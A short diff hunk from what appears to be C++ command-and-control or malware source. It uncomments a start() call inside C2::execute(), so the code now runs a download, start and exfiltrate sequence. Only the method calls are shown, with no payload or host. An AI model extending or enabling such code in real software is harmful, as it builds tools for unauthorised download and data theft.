@@ -11,7 +11,7 @@
 
 void C2::execute() {
 	this->download();
-	//this->start();
+	this->start();
 	this->exfiltrate();
 }
 
